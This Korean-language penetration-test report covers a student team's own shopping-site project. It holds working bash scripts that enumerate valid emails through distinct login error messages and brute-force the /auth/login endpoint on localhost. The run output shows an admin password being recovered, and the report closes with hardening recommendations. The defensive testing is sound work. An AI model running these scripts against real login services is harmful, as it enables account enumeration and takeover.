# Brute Force 공격 실험 보고서 (Linux Shell Script 기반) - 안윤기
> - 3차 팀 프로젝트 : HALO SHOP
> - 결론 : 
>   1. "무작위 대입 공격" 막는 로직 없음
>    2. 단순 쉘 스크립트가 아닌 c언어 기반 히드라툴로 공격했을 경우 계정탈취 뿐만 아니라 dos공격으로 인하여 서버 다운 위험 있음
>       - admin 계정 로그인 방식은 argon2+세션방식이기 때문에 더욱 더 위험함

##  실험 목적

* 프로젝트의 로그인 보안 취약성 확인
* 리눅스 bash 스크립트를 이용한 무차별 대입(Brute Force) 공격 수행

---

##  환경 구성

* **OS**: Ubuntu 22.04 LTS (WSL 환경)
* **타겟 서버**: 윈도우에서 실행한 React 프론트 + Spring Boot 백엔드 (포트 8080)
* **관리자 로그인 엔드포인트**: `POST /auth/login`
* **응답 메시지**: 이메일 존재 여부/비밀번호 불일치 명확히 구분됨

---

##  준비 1: 사용자 패스워드 리스트 파일 생성

```bash
nano /home/ubuntu/userpass.txt
```

내용:

```
admin:admin
test@example.com:1234
admin1@gmail.com:1234
admin0@gmail.com:1234
user1@gmail.com:1234
```

파일 권한 확인:

```bash
ls -l /home/ubuntu/userpass.txt
```

---

##  준비 2: 이메일 존재 여부 체크 스크립트 작성

```bash
nano check_email.sh
```

```bash
#!/bin/bash

echo "[*] 이메일 존재 여부 확인 시작..."
while IFS= read -r email; do
  echo "[*] 이메일 확인 중: $email"
  response=$(curl -s -X POST http://localhost:8080/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$email\", \"password\": \"wrongpass\"}")

  echo "[응답]: $(echo $response | jq -r .message)"
  if [[ "$response" == *"비밀번호가 일치하지 않습니다"* ]]; then
    echo " 존재하는 이메일! → $email"
  fi
done < email_list.txt
```

이메일 리스트 작성:

```bash
nano email_list.txt
```

예시:

```
admin@admin.com
user1@example.com
test@example.com
halo123@shop.com
admin1@gmail.com
admin0@gmail.com
user1@gmail.com
abc@gmail.com
```

권한 부여 및 실행:

```bash
chmod +x check_email.sh
./check_email.sh
```

---

##  준비 3: 브루트포스 공격 스크립트 시도

```bash
nano brute.sh
```

```bash
#!/bin/bash

FILE="/home/ubuntu/userpass.txt"
echo "[*] Brute force 시작..."

while IFS=: read -r email password; do
  echo "[*] 시도 중: $email / $password"
  response=$(curl -s -X POST http://localhost:8080/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$email\", \"password\": \"$password\"}")

  echo "[응답 본문]: $(echo $response | jq -r .message)"

  if [[ "$response" == *"로그인 성공"* ]]; then
    echo " 성공!!! → $email / $password"
    break
  elif [[ "$response" == *"가입되지 않은 이메일"* ]]; then
    echo "❌ 이메일 없음: $email"
  else
    echo "❌ 실패: $email / $password"
  fi
done < "$FILE"
```

권한 부여 및 실행:

```bash
chmod +x brute.sh
./brute.sh
```

---

##  실행 결과

```
[*] Brute force 시작...
[*] 시도 중: admin / admin
[응답 본문]: 가입되지 않은 이메일입니다.
❌ 이메일 없음: admin

[*] 시도 중: test@example.com / 1234
[응답 본문]: 가입되지 않은 이메일입니다.
❌ 이메일 없음: test@example.com

[*] 시도 중: admin1@gmail.com / 1234
[응답 본문]: 관리자 로그인 성공
 성공!!! → admin1@gmail.com / 1234
```
##### *자동탐지 미들웨어로 인하여 로그에는 찍혀있음

---

## 취약점 분석 요약

| 항목         | 상태 | 보안 위험           |
| ---------- | -- | --------------- |
| 응답 메시지 차별화 | 있음 | 사용자 존재 여부 식별 가능 |
| 로그인 제한 횟수  | 없음 | 무한 대입 가능        |
| CAPTCHA    | 없음 | 자동화 공격 가능       |
| 관리자 계정 2FA | 없음 | 위험              |

---

## 권고 사항

* 로그인 시도 제한 도입 (IP 또는 이메일 기준)
* 응답 메시지 통일 → "아이디 또는 비밀번호가 틀렸습니다"
* CAPTCHA 도입
* 관리자 계정 → OTP/2FA(인증) 필수화
* 공격 탐지 로깅 및 보안 로그 수집 자동화

---

*본 실험은 보안 점검 및 테스트 목적으로만 수행되었으며, 실제 공격 행위로 사용되어서는 안 됩니다. 참고하세요*
